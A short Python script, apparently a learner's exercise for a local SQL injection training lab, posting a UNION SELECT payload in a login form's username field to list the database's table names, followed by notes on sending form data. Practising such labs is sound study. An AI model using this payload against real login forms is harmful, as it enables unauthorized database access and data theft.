import requests

url = "http://localhost:8000/Less-11/"

info = {"uname":"' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #","passwd":"ok"}

x = requests.post(url,data=info)


print(x.text)

# Things that i learned  inorder to send form data you have to use the data element while sending the post request and not the json element
# The remaining injection remains the same as previous script